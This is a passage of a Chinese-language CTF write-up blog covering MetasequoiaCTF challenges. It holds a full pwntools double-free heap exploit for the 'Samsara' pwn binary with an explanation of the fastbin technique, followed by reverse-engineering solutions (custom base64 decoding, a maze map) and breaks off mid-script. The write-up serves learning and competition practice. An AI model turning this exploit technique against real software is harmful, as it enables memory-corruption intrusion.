turned yourself into the Demon Dragon..."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> ) &#123;</span><br><span class="line">    v12 = <span class="number">0L</span>L;</span><br><span class="line">    sub_A50(v4, v3);</span><br><span class="line">    v3 = (__int64 *)&amp;v6;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)off_F70 )&#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:                                  <span class="comment">// capture</span></span><br><span class="line">        <span class="keyword">if</span> ( i &gt;= <span class="number">7</span> )&#123;</span><br><span class="line">          v4 = <span class="string">"You can't capture more people."</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"You can't capture more people."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          v5 = i;</span><br><span class="line">          people[v5] = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">          ++i;</span><br><span class="line">          v4 = <span class="string">"Captured."</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Captured."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:                                  <span class="comment">// eat</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">        v3 = (__int64 *)&amp;v7;</span><br><span class="line">        _isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">        <span class="built_in">free</span>(people[v7]);</span><br><span class="line">        v4 = <span class="string">"Eaten."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Eaten."</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:                                  <span class="comment">// cook</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">        _isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Ingredient:"</span>);</span><br><span class="line">        v3 = &amp;v12;</span><br><span class="line">        _isoc99_scanf(<span class="string">"%llu"</span>, &amp;v12);</span><br><span class="line">        *(_QWORD *)people[v7] = v12;</span><br><span class="line">        v4 = <span class="string">"Cooked."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Cooked."</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:                                  <span class="comment">// show</span></span><br><span class="line">        v3 = &amp;v9;</span><br><span class="line">        v4 = <span class="string">"Your lair is at: %p\n"</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Your lair is at: %p\n"</span>, &amp;v9);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:                                  <span class="comment">// move</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Which kingdom?"</span>);</span><br><span class="line">        v3 = &amp;v11;</span><br><span class="line">        _isoc99_scanf(<span class="string">"%llu"</span>, &amp;v11);</span><br><span class="line">        v9 = v11;</span><br><span class="line">        v4 = <span class="string">"Moved."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Moved."</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:                                  <span class="comment">// flag</span></span><br><span class="line">        <span class="keyword">if</span> ( v10 == <span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">          system(<span class="string">"cat flag"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Now, there's no Demon Dragon anymore..."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>在栈上伪造chunk，然后利用<code>double free</code>分配一个位于<code>v9-8</code>的chunk，输入3修改这个chunk，被修改的地址为<code>v9-8+16 = v10</code>，向其中写<code>0xdeadbeef</code>即可getflag</p><p>输入4修改<code>v9</code>的值为<code>0x21</code>即可伪造chunk，不伪造chunk的话，<code>malloc</code>会报错</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk+0:  v9-8:xxx      v9: 0x21</span><br><span class="line">chunk+8:  v10: 0x0      xxxxxxxx</span><br></pre></td></tr></table></figure></div><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./samsara'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">capture</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'Index:\n'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cook</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">'Index:\n'</span>,str(index))</span><br><span class="line">    sla(<span class="string">'Ingredient:\n'</span>,str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Your lair is at: '</span>)</span><br><span class="line">    <span class="keyword">return</span> eval(rc(<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(data)</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line">    sla(<span class="string">'Which kingdom?\n'</span>,str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">'choice &gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">ptr = show()</span><br><span class="line">info_addr(<span class="string">'ptr'</span>,ptr)</span><br><span class="line">move(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">capture() <span class="comment"># 0</span></span><br><span class="line">capture() <span class="comment"># 1</span></span><br><span class="line">capture() <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line">eat(<span class="number">1</span>)</span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">capture()   <span class="comment"># 3</span></span><br><span class="line">cook(<span class="number">0</span>,ptr<span class="number">-0x8</span>) </span><br><span class="line">capture()   <span class="comment"># 4</span></span><br><span class="line">capture()   <span class="comment"># 5 </span></span><br><span class="line">capture()   <span class="comment"># 6 </span></span><br><span class="line">cook(<span class="number">6</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">commit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="官方wp-1"><a href="#官方wp-1" class="headerlink" title="官方wp"></a>官方wp</h3><p>官方wp讲解的很详细啊，摘录过来：D</p><blockquote><p>逆向可以知道每次抓人都执行<code>malloc(8)</code>，我们不能控制分配的大小。那么在释放的时候，chunk必定进入fastbin。操作3就是编辑chunk的内容，不存在溢出。但是这题有两个奇怪的操作：输入4会打印出栈上变量<code>lair</code>的位置，输入5会改变<code>lair</code>的值。最后，退出程序时，检查栈上变量<code>target</code>是否等于<code>0xdeadbeef</code>，如果等于就能getflag，但是整个程序中不存在对<code>target</code>的任何读写操作。</p><p>漏洞点在于<code>free</code>之后没有置指针为NULL，考虑<code>double free</code>。首先分配三个chunk，按<code>chunk0-&gt;chunk1-&gt;chunk0</code>的顺序释放，第二次释放<code>chunk0</code>时它不在对应fastbin的头部，因此不会被检测到。再申请两次分别得到<code>chunk3</code>和<code>chunk4</code>，按first-fit原则前者即<code>chunk0</code>，后者即<code>chunk1</code>，但此时<code>chunk0</code>依然会留在fastbin中。</p><p>接下来，我们在<code>target</code>附近伪造chunk。我们逆向发现<code>lair</code>在<code>target</code>上方8B处，因此先输入4，设置<code>lair=0x20</code>以伪造<code>chunk_size</code>。然后输入5得到<code>&amp;lair</code>，那么<code>&amp;lair-8</code>处就是伪造的chunk的chunk指针。伪造好以后，我们向<code>chunk3</code>即<code>chunk0</code>的<code>fd</code>写入<code>&amp;lair-8</code>。此时，fastbin内就变成了<code>chunk0-&gt;fake_chunk</code>，申请一次得到<code>chunk0</code>，第二次得到<code>fake_chunk</code>。</p><p>此时向<code>fake_chunk</code>写数据，等价于向<code>(&amp;lair-8) + 0x10</code>也就是<code>target</code>写数据，写入<code>0xdeadbeef</code>并退出程序即可。</p><p>ref: <a href="https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Samsara" target="_blank" rel="noopener">Samsara</a></p></blockquote><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>re也都中规中矩，其中有一到smali的题，首次接触，涨了涨姿势</p><h2 id="CMCS"><a href="#CMCS" class="headerlink" title="CMCS"></a>CMCS</h2><ul><li><p>题目描述：</p><blockquote><p>你主导开发的CMCS(<code>Cyber Malware Control Software</code>)可以对全球各个角落的网络爬虫进行监控。但是今天，它似乎失灵了……<br><strong>得到的flag请包上flag提交。</strong><br>By <em>?</em></p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/CMCS/attachment.zip" target="_blank" rel="noopener">attachment.zip</a></p></li><li><p>考察点：逆向分析</p></li><li><p>难度：简单</p></li><li><p>初始分值：100</p></li><li><p>最终分值：91</p></li><li><p>完成人数：5</p></li></ul><p>主要代码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_8048708</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">wchar_t</span> ws[<span class="number">8192</span>]; <span class="comment">// [esp+1Ch] [ebp-800Ch]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *s2; <span class="comment">// [esp+801Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s2 = sub_8048658(&amp;s, &amp;dword_8048A90);</span><br><span class="line">  <span class="keyword">if</span> ( fgetws(ws, <span class="number">0x2000</span>, <span class="built_in">stdin</span>) )&#123;</span><br><span class="line">    ws[wcslen(ws) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;right);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      wprintf(&amp;failed);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输入的字符串与<code>sub_8048658</code>的返回结果做比较，直接<code>gdb</code>调试，获取<code>sub_8048658</code>的返回值即为flag</p><blockquote><p>9447{you_are_an_international_mystery}</p></blockquote><p>9447 CTF 原题，flag都没改…</p><h2 id="babysmali"><a href="#babysmali" class="headerlink" title="babysmali"></a>babysmali</h2><ul><li><p>题目描述：</p><blockquote><p>你似乎找到了破坏CMCS的软件，于是尝试对其进行逆向，希望能发现这一切背后的始作俑者……<br><strong>得到的 flag 请包上 flag{} 提交。</strong><br>By <em>?</em></p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/Babysmali/attachment.zip" target="_blank" rel="noopener">attachment.zip</a></p></li><li><p>考察点：smali逆向、base64换表</p></li><li><p>难度：简单</p></li><li><p>初始分值：250</p></li><li><p>最终分值：245</p></li><li><p>完成人数：2</p></li></ul><p>先把smali转成java，再分析即可，用到的工具如下：</p><ul><li>smali.jar</li><li>dex2jar-2.0</li><li>jd-gui</li></ul><h3 id="smali-gt-dex"><a href="#smali-gt-dex" class="headerlink" title="smali-&gt;dex"></a>smali-&gt;dex</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java -jar ./smali.jar ass ./src.smali</span></span><br></pre></td></tr></table></figure></div><h3 id="dex-gt-jar"><a href="#dex-gt-jar" class="headerlink" title="dex-&gt;jar"></a>dex-&gt;jar</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./d2j-dex2jar.sh ./out.dex</span></span><br></pre></td></tr></table></figure></div><h3 id="jar-gt-java"><a href="#jar-gt-java" class="headerlink" title="jar-&gt;java"></a>jar-&gt;java</h3><p>用jd-gui打开jar文件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hellosmali.hellosmali;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Digest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String paramString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (paramString != <span class="keyword">null</span> &amp;&amp; paramString.length() != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">char</span>[] arrayOfChar = paramString.toCharArray();</span><br><span class="line">      StringBuilder stringBuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">int</span> i;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++) &#123;</span><br><span class="line">        String str1;</span><br><span class="line">        <span class="keyword">for</span> (str1 = Integer.toBinaryString(arrayOfChar[i]); str1.length() &lt; <span class="number">8</span>; str1 = <span class="string">"0"</span> + str1);</span><br><span class="line">        stringBuilder2.append(str1);</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">while</span> (stringBuilder2.length() % <span class="number">6</span> != <span class="number">0</span>)</span><br><span class="line">        stringBuilder2.append(<span class="string">"0"</span>); </span><br><span class="line">      String str = String.valueOf(stringBuilder2);</span><br><span class="line">      arrayOfChar = <span class="keyword">new</span> <span class="keyword">char</span>[str.length() / <span class="number">6</span>];</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arrayOfChar.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> j = Integer.parseInt(str.substring(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">        str = str.substring(<span class="number">6</span>);</span><br><span class="line">        arrayOfChar[i] = <span class="string">"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>.charAt(j);</span><br><span class="line">      &#125; </span><br><span class="line">      StringBuilder stringBuilder1 = <span class="keyword">new</span> StringBuilder(String.valueOf(arrayOfChar));</span><br><span class="line">      <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        stringBuilder1.append(<span class="string">"!?"</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramString.length() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">        stringBuilder1.append(<span class="string">"!"</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">return</span> String.valueOf(stringBuilder1).equals(<span class="string">"xsZDluYYreJDyrpDpucZCo!?"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>自定义base64，写脚本解密：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">"xsZDluYYreJDyrpDpucZCo!?"</span>[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    l.append(table.index(i))</span><br><span class="line"></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">    s += b</span><br><span class="line"></span><br><span class="line"><span class="comment"># print s</span></span><br><span class="line"></span><br><span class="line">h = hex(int(s,<span class="number">2</span>))[<span class="number">2</span>:<span class="number">-2</span>]</span><br><span class="line"><span class="comment"># print h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%h.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></div><h2 id="Prison"><a href="#Prison" class="headerlink" title="Prison"></a>Prison</h2><ul><li><p>题目描述：</p><blockquote><p>你的发现触动了某些人的利益，他们将你囚禁了起来。为了活下去，你必须逃离这里！<br><strong>flag格式：flag{你的逃跑路线}</strong><br>By <em>?</em></p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/Prison/attachment.zip" target="_blank" rel="noopener">attachment.zip</a></p></li><li><p>考察点：逆向分析地图题</p></li><li><p>难度：中等</p></li><li><p>初始分值：350</p></li><li><p>最终分值：335</p></li><li><p>完成人数：4</p></li></ul><p>走迷宫，地图是乱序给的，需要重新整理一下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">map = &#123;<span class="number">0</span>:<span class="string">"**########################################################################################"</span>,</span><br><span class="line"><span class="number">10</span>:<span class="string">"#************######*##############**************##*####*#######*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">22</span>:<span class="string">"###*#########*****************************************************************############"</span>,</span><br><span class="line"><span class="number">24</span>:<span class="string">"###*#########*###############################################*######*****************#####"</span>,</span><br><span class="line"><span class="number">21</span>:<span class="string">"###**********#############################################################################"</span>,</span><br><span class="line"><span class="number">1</span>:<span class="string">"#*######################*******************************************#####*************#####"</span>,</span><br><span class="line"><span class="number">20</span>:<span class="string">"############*#####*******************************************************************#####"</span>,</span><br><span class="line"><span class="number">15</span>:<span class="string">"###*#################################################*#########*##*######*#####*####*#####"</span>,</span><br><span class="line"><span class="number">16</span>:<span class="string">"###*####*****#####**********************#############*#########*##********#####*####*#####"</span>,</span><br><span class="line"><span class="number">2</span>:<span class="string">"#************************####*####################################*#####*###########*#####"</span>,</span><br><span class="line"><span class="number">18</span>:<span class="string">"###*####*###*#####*############################################*****************####*#####"</span>,</span><br><span class="line"><span class="number">17</span>:<span class="string">"###*####*###*#####*####################***************#########*###############*####*#####"</span>,</span><br><span class="line"><span class="number">3</span>:<span class="string">"#########*#########*#########*#######***************************##*#####*###########*#####"</span>,</span><br><span class="line"><span class="number">26</span>:<span class="string">"#############################################################*######*#####################"</span>,</span><br><span class="line"><span class="number">4</span>:<span class="string">"#******##*#########*#########*#######*#########################*##*#####*###########*#####"</span>,</span><br><span class="line"><span class="number">5</span>:<span class="string">"#*####*##*#########*#########*#######*#########################*##*#####********####*#####"</span>,</span><br><span class="line"><span 